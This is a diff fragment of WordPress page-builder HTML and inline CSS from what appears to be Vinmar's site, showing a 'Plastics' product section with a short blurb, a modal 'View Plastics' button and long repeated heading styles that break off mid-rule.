+	<?xml version="1.0" encoding="UTF-8"?><svg id="a" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 510 1020"><defs><style>.b{fill:none;stroke:#fff;stroke-miterlimit:10;stroke-width:2px;}.c{fill:#00664f;}</style></defs><path class="c" d="M0,3c280.01,0,507,226.99,507,507S280.01,1017,0,1017V3Z"/><path class="b" d="M0,3c280.01,0,507,226.99,507,507S280.01,1017,0,1017"/></svg></div>
+<div  class="fl-module fl-module-box fl-node-sxf8l0k3ypr7 fl-animation fl-fade-up" data-node="sxf8l0k3ypr7" data-animation-delay="0" data-animation-duration="1" aria-label="Box">
+	<div class="fl-module fl-module-pp-heading fl-node-xbc14wfitnhs" data-node="xbc14wfitnhs" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-left">
+		
+		<h5 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Plastics</span>
+
+			
+			
+		</h5>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<p>Vinmar offers a broad portfolio of plastic materials helping customers with their evolving business requirements. Contact us to identify the right product for your application, along with support for logistics, financing, and trade compliance.</p>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-modal-box fl-node-swtakj920efz" data-node="swtakj920efz" aria-label="Modal Box">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-modal-button">
+	<a href="#" id="trigger-swtakj920efz" class="pp-modal-trigger modal-swtakj920efz" role="button" data-modal="swtakj920efz" data-node="swtakj920efz">
+									<span class="pp-modal-trigger-text">View Plastics</span>
+							<span class="pp-button-icon pp-button-icon-after fas fa-arrow-circle-right"></span>
+												</a>
+</div>
+<div id="modal-swtakj920efz" class="pp-modal-wrap has-overlay-animation" role="dialog">
+	<div class="pp-modal-container">
+				<div class="pp-modal layout-fullscreen">
+						<div class="pp-modal-body">
+															<div class="pp-modal-close box-top-right no-modal-header" role="button" tabindex="0" aria-label="Close">
+							<div class="bar-wrap" aria-hidden="true">
+								<span class="bar-1"></span>
+								<span class="bar-2"></span>
+							</div>
+						</div>
+																	<div class="pp-modal-content">
+					<div class="pp-modal-content-inner">
+						<p><link rel='stylesheet' id='fl-builder-wp-editor-css' href='https://www.vinmar.com/wp-content/plugins/bb-plugin/css/build/wp-editor.bundle.min.css?ver=2.11' media='all' />
+<style id="fl-builder-layout-89-inline-css">
+.fl-module-box:before,.fl-module-box:after {position: absolute;}a.fl-module-box {text-decoration: none;}.fl-module-box :where( .fl-module ),.fl-module-box :where( .fl-module-content ),.fl-module-box.fl-block > * {margin: 0;}:where(.fl-module-box:has([class*="slide"],[class*="carousel"],[class*="swiper"])) {min-width: 0;}.fl-builder-content-89 .fl-node-vh4t65zrjklm {display: grid;grid-template-columns: repeat(3,1fr);grid-template-rows: repeat(1,1fr);flex-direction: row;row-gap: 20px;column-gap: 20px;}:where( .fl-builder-content-89 .fl-node-vh4t65zrjklm > :not( .fl-block-overlay, .fl-drop-target ) ) {padding-top: 20px;padding-right: 20px;padding-bottom: 20px;padding-left: 20px;background-color: rgb(255, 255, 255);border-top-left-radius: 20px;border-top-right-radius: 20px;border-bottom-left-radius: 20px;border-bottom-right-radius: 20px;}.bb-heading-input.input-small {width: 46px !important;}.pp-heading-content {overflow: hidden;}.pp-heading-content .pp-heading-link {text-decoration: none;}.pp-heading-content span.heading-title {display: block;}.pp-heading-content .pp-heading.pp-separator-inline .heading-title {display: inline-block;}.pp-heading-content .pp-heading.pp-separator-inline .heading-title span {position: relative;display: inline-block;}.pp-heading-content .pp-heading.pp-separator-inline .heading-title span:before,.pp-heading-content .pp-heading.pp-separator-inline .heading-title span:after {content: "";display: block;position: absolute;top: 50%;border-width: 0;}.pp-heading-content .pp-heading.pp-separator-inline .heading-title span:before {right: 100%;}.pp-heading-content .pp-heading.pp-separator-inline .heading-title span:after {left: 100%;}.pp-heading-content .pp-heading.pp-separator-inline.pp-left .heading-title span {padding-left: 0 !important;}.pp-heading-content .pp-heading.pp-separator-inline.pp-right .heading-title span {padding-right: 0 !important;}.pp-heading-content .pp-heading.pp-separator-inline.pp-left .heading-title span:before {display: none;}.pp-heading-content .pp-heading.pp-separator-inline.pp-right .heading-title span:after {display: none;}.pp-heading-content .pp-heading.pp-separator--inline {display: flex;align-items: center;}.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator {flex: 1;}.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator span {display: block;}.pp-heading-content .pp-heading.pp-separator--inline.pp-left > .pp-heading-separator:first-of-type,.pp-heading-content .pp-heading.pp-separator--inline.pp-right > .pp-heading-separator:last-of-type {display: none;}.rtl .pp-heading-content .pp-heading.pp-separator--inline.pp-right > .pp-heading-separator:last-of-type {display: block;}.rtl .pp-heading-content .pp-heading.pp-separator--inline.pp-right > .pp-heading-separator:first-of-type {display: none;}.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:first-of-type span {margin: 0 0 0 auto;}.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:last-of-type span {margin: 0 auto 0 0;}.pp-heading-content .pp-heading-separator {margin: 0 auto;padding: 0;position: relative;overflow: hidden;}.pp-heading-content .pp-heading-separator.line_with_icon:before {right: 50%;left: auto;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-left:before {display: none;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-right:after {display: none;}.pp-heading-content .pp-heading-separator.line_with_icon:after {left: 50%;right: auto;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-left:after {left: 1%;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-right:before {right: 1%;}.pp-heading-content .pp-heading-separator.line_with_icon:before,.pp-heading-content .pp-heading-separator.line_with_icon:after {content: "";position: absolute;bottom: 50%;border-width: 0;top: 50%;}.pp-heading-content .pp-heading-separator .heading-icon-image {vertical-align: middle;box-shadow: none !important;max-width: 100%;}.pp-heading-content .pp-heading-separator .pp-separator-line {max-width: 100%;display: block;}.pp-heading-content .pp-heading-separator .pp-heading-separator-icon {display: inline-block;text-align: center;}.pp-heading-content .pp-heading-separator.icon_only span {display: inline-block;}@media only screen and (max-width: 768px) {.pp-heading-content .pp-heading.pp-separator-inline.pp-tablet-left .heading-title span {padding-left: 0 !important;}.pp-heading-content .pp-heading.pp-separator-inline.pp-tablet-right .heading-title span {padding-right: 0 !important;}.pp-heading-content .pp-heading.pp-separator-inline.pp-tablet-left .heading-title span:before {display: none;}.pp-heading-content .pp-heading.pp-separator-inline.pp-tablet-right .heading-title span:after {display: none;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-tablet-left:before {display: none;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-tablet-right:after {display: none;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-tablet-left:after {left: 2%;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-tablet-right:before {right: 2%;}}@media only screen and (max-width: 480px) {.pp-heading-content .pp-heading.pp-separator-inline.pp-mobile-left .heading-title span {padding-left: 0 !important;}.pp-heading-content .pp-heading.pp-separator-inline.pp-mobile-right .heading-title span {padding-right: 0 !important;}.pp-heading-content .pp-heading.pp-separator-inline.pp-mobile-left .heading-title span:before {display: none;}.pp-heading-content .pp-heading.pp-separator-inline.pp-mobile-right .heading-title span:after {display: none;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-mobile-left:before {display: none;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-mobile-left:before {display: none;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-mobile-right:after {display: none;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-mobile-left:after {left: 2%;}.pp-heading-content .pp-heading-separator.line_with_icon.pp-mobile-right:before {right: 2%;}}@media (max-width: 768px) {}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-prefix {}div.fl-node-xb8nark7jdp2 .pp-heading-content {text-align: ;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading {}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading .heading-title span.title-text {display: inline;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading .heading-title span.pp-primary-title {color: rgb(0, 0, 0);display: inline;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading .heading-title:hover span.pp-primary-title {}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading .heading-title span.pp-secondary-title {display: inline;margin-left: 0px;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading .heading-title:hover span.pp-secondary-title {}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading.pp-separator--inline,div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading:not(.pp-separator--inline) .heading-title {margin-top: 10px;margin-bottom: 10px;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading .heading-title.text-inline-block span.pp-primary-title,div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading .heading-title.text-inline-block span.pp-secondary-title {display: inline-block;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading .pp-heading-link {}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading.pp-separator-inline .heading-title span:before {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading.pp-separator-inline .heading-title span:after {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading.pp-separator--inline .pp-heading-separator span {width: 100px;border-bottom-style: solid;border-bottom-width: 1px;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-sub-heading {margin-top: 0px;margin-bottom: 0px;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-sub-heading,div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-sub-heading p {color: rgb(0, 0, 0);}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-sub-heading p:last-of-type {margin-bottom: 0;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator .pp-heading-separator-align {}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator.line_with_icon {}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator.line_with_icon:before {margin-right: 20px;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator.line_with_icon:after {margin-left: 20px;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator.line_with_icon.pp-left:after {left: 1%;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator.line_with_icon.pp-right:before {right: 1%;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator.line_with_icon:before,div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator.line_with_icon:after {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator .heading-icon-image {}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator .pp-separator-line {border-bottom-style: solid;border-bottom-width: 1px;width: 100px;margin: 0 auto;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator:not(.inline) {}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator .pp-heading-separator-icon {display: inline-block;text-align: center;border-radius: 100px;border-width: 0px;border-style: none;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator .pp-heading-separator-icon i,div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator .pp-heading-separator-icon i:before {font-size: 16px;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator.icon_only span {border-radius: 100px;border-width: 0px;border-style: none;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator.icon_only img,div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator.line_with_icon img {border-radius: 100px;}@media only screen and (max-width: 992px) {div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator .pp-heading-separator-align,div.fl-node-xb8nark7jdp2 .pp-heading-content {text-align: ;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator .pp-separator-line {}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-prefix {}}@media only screen and (max-width: 768px) {div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator .pp-heading-separator-align,div.fl-node-xb8nark7jdp2 .pp-heading-content {text-align: ;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator .pp-separator-line {}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-prefix {}}div.fl-node-xb8nark7jdp2 div.pp-heading-content .pp-heading.pp-separator-inline .heading-title span, div.fl-node-xb8nark7jdp2 div.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:last-of-type {padding-left: 20px;}div.fl-node-xb8nark7jdp2 div.pp-heading-content .pp-heading.pp-separator-inline .heading-title span, div.fl-node-xb8nark7jdp2 div.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:first-of-type {padding-right: 20px;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator .pp-heading-separator-icon {padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}div.fl-node-xb8nark7jdp2 .pp-heading-content .pp-heading-separator.icon_only span {padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-prefix {}div.fl-node-xnbceitf3m54 .pp-heading-content {text-align: ;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading {}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading .heading-title span.title-text {display: inline;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading .heading-title span.pp-primary-title {color: rgb(0, 0, 0);display: inline;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading .heading-title:hover span.pp-primary-title {}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading .heading-title span.pp-secondary-title {display: inline;margin-left: 0px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading .heading-title:hover span.pp-secondary-title {}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading.pp-separator--inline,div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading:not(.pp-separator--inline) .heading-title {margin-top: 10px;margin-bottom: 10px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading .heading-title.text-inline-block span.pp-primary-title,div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading .heading-title.text-inline-block span.pp-secondary-title {display: inline-block;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading .pp-heading-link {}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading.pp-separator-inline .heading-title span:before {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading.pp-separator-inline .heading-title span:after {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading.pp-separator--inline .pp-heading-separator span {width: 100px;border-bottom-style: solid;border-bottom-width: 1px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-sub-heading {margin-top: 0px;margin-bottom: 0px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-sub-heading,div.fl-node-xnbceitf3m54 .pp-heading-content .pp-sub-heading p {color: rgb(0, 0, 0);}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-sub-heading p:last-of-type {margin-bottom: 0;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator .pp-heading-separator-align {}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator.line_with_icon {}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator.line_with_icon:before {margin-right: 20px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator.line_with_icon:after {margin-left: 20px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator.line_with_icon.pp-left:after {left: 1%;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator.line_with_icon.pp-right:before {right: 1%;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator.line_with_icon:before,div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator.line_with_icon:after {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator .heading-icon-image {}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator .pp-separator-line {border-bottom-style: solid;border-bottom-width: 1px;width: 100px;margin: 0 auto;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator:not(.inline) {}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator .pp-heading-separator-icon {display: inline-block;text-align: center;border-radius: 100px;border-width: 0px;border-style: none;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator .pp-heading-separator-icon i,div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator .pp-heading-separator-icon i:before {font-size: 16px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator.icon_only span {border-radius: 100px;border-width: 0px;border-style: none;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator.icon_only img,div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator.line_with_icon img {border-radius: 100px;}@media only screen and (max-width: 992px) {div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator .pp-heading-separator-align,div.fl-node-xnbceitf3m54 .pp-heading-content {text-align: ;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator .pp-separator-line {}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-prefix {}}@media only screen and (max-width: 768px) {div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator .pp-heading-separator-align,div.fl-node-xnbceitf3m54 .pp-heading-content {text-align: ;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator .pp-separator-line {}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-prefix {}}div.fl-node-xnbceitf3m54 div.pp-heading-content .pp-heading.pp-separator-inline .heading-title span, div.fl-node-xnbceitf3m54 div.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:last-of-type {padding-left: 20px;}div.fl-node-xnbceitf3m54 div.pp-heading-content .pp-heading.pp-separator-inline .heading-title span, div.fl-node-xnbceitf3m54 div.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:first-of-type {padding-right: 20px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator .pp-heading-separator-icon {padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}div.fl-node-xnbceitf3m54 .pp-heading-content .pp-heading-separator.icon_only span {padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-prefix {}div.fl-node-dafey5tu81qk .pp-heading-content {text-align: ;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading {}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading .heading-title span.title-text {display: inline;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading .heading-title span.pp-primary-title {color: rgb(0, 0, 0);display: inline;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading .heading-title:hover span.pp-primary-title {}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading .heading-title span.pp-secondary-title {display: inline;margin-left: 0px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading .heading-title:hover span.pp-secondary-title {}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading.pp-separator--inline,div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading:not(.pp-separator--inline) .heading-title {margin-top: 10px;margin-bottom: 10px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading .heading-title.text-inline-block span.pp-primary-title,div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading .heading-title.text-inline-block span.pp-secondary-title {display: inline-block;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading .pp-heading-link {}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading.pp-separator-inline .heading-title span:before {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading.pp-separator-inline .heading-title span:after {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading.pp-separator--inline .pp-heading-separator span {width: 100px;border-bottom-style: solid;border-bottom-width: 1px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-sub-heading {margin-top: 0px;margin-bottom: 0px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-sub-heading,div.fl-node-dafey5tu81qk .pp-heading-content .pp-sub-heading p {color: rgb(0, 0, 0);}div.fl-node-dafey5tu81qk .pp-heading-content .pp-sub-heading p:last-of-type {margin-bottom: 0;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator .pp-heading-separator-align {}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator.line_with_icon {}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator.line_with_icon:before {margin-right: 20px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator.line_with_icon:after {margin-left: 20px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator.line_with_icon.pp-left:after {left: 1%;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator.line_with_icon.pp-right:before {right: 1%;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator.line_with_icon:before,div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator.line_with_icon:after {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator .heading-icon-image {}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator .pp-separator-line {border-bottom-style: solid;border-bottom-width: 1px;width: 100px;margin: 0 auto;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator:not(.inline) {}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator .pp-heading-separator-icon {display: inline-block;text-align: center;border-radius: 100px;border-width: 0px;border-style: none;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator .pp-heading-separator-icon i,div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator .pp-heading-separator-icon i:before {font-size: 16px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator.icon_only span {border-radius: 100px;border-width: 0px;border-style: none;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator.icon_only img,div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator.line_with_icon img {border-radius: 100px;}@media only screen and (max-width: 992px) {div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator .pp-heading-separator-align,div.fl-node-dafey5tu81qk .pp-heading-content {text-align: ;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator .pp-separator-line {}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-prefix {}}@media only screen and (max-width: 768px) {div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator .pp-heading-separator-align,div.fl-node-dafey5tu81qk .pp-heading-content {text-align: ;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator .pp-separator-line {}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-prefix {}}div.fl-node-dafey5tu81qk div.pp-heading-content .pp-heading.pp-separator-inline .heading-title span, div.fl-node-dafey5tu81qk div.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:last-of-type {padding-left: 20px;}div.fl-node-dafey5tu81qk div.pp-heading-content .pp-heading.pp-separator-inline .heading-title span, div.fl-node-dafey5tu81qk div.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:first-of-type {padding-right: 20px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator .pp-heading-separator-icon {padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}div.fl-node-dafey5tu81qk .pp-heading-content .pp-heading-separator.icon_only span {padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-prefix {}div.fl-node-9dbn8axq32jt .pp-heading-content {text-align: ;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading {}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading .heading-title span.title-text {display: inline;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading .heading-title span.pp-primary-title {color: rgb(0, 0, 0);display: inline;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading .heading-title:hover span.pp-primary-title {}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading .heading-title span.pp-secondary-title {display: inline;margin-left: 0px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading .heading-title:hover span.pp-secondary-title {}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading.pp-separator--inline,div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading:not(.pp-separator--inline) .heading-title {margin-top: 10px;margin-bottom: 10px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading .heading-title.text-inline-block span.pp-primary-title,div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading .heading-title.text-inline-block span.pp-secondary-title {display: inline-block;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading .pp-heading-link {}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading.pp-separator-inline .heading-title span:before {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading.pp-separator-inline .heading-title span:after {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading.pp-separator--inline .pp-heading-separator span {width: 100px;border-bottom-style: solid;border-bottom-width: 1px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-sub-heading {margin-top: 0px;margin-bottom: 0px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-sub-heading,div.fl-node-9dbn8axq32jt .pp-heading-content .pp-sub-heading p {color: rgb(0, 0, 0);}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-sub-heading p:last-of-type {margin-bottom: 0;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator .pp-heading-separator-align {}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator.line_with_icon {}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator.line_with_icon:before {margin-right: 20px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator.line_with_icon:after {margin-left: 20px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator.line_with_icon.pp-left:after {left: 1%;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator.line_with_icon.pp-right:before {right: 1%;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator.line_with_icon:before,div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator.line_with_icon:after {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator .heading-icon-image {}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator .pp-separator-line {border-bottom-style: solid;border-bottom-width: 1px;width: 100px;margin: 0 auto;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator:not(.inline) {}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator .pp-heading-separator-icon {display: inline-block;text-align: center;border-radius: 100px;border-width: 0px;border-style: none;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator .pp-heading-separator-icon i,div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator .pp-heading-separator-icon i:before {font-size: 16px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator.icon_only span {border-radius: 100px;border-width: 0px;border-style: none;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator.icon_only img,div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator.line_with_icon img {border-radius: 100px;}@media only screen and (max-width: 992px) {div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator .pp-heading-separator-align,div.fl-node-9dbn8axq32jt .pp-heading-content {text-align: ;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator .pp-separator-line {}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-prefix {}}@media only screen and (max-width: 768px) {div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator .pp-heading-separator-align,div.fl-node-9dbn8axq32jt .pp-heading-content {text-align: ;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator .pp-separator-line {}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-prefix {}}div.fl-node-9dbn8axq32jt div.pp-heading-content .pp-heading.pp-separator-inline .heading-title span, div.fl-node-9dbn8axq32jt div.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:last-of-type {padding-left: 20px;}div.fl-node-9dbn8axq32jt div.pp-heading-content .pp-heading.pp-separator-inline .heading-title span, div.fl-node-9dbn8axq32jt div.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:first-of-type {padding-right: 20px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator .pp-heading-separator-icon {padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}div.fl-node-9dbn8axq32jt .pp-heading-content .pp-heading-separator.icon_only span {padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 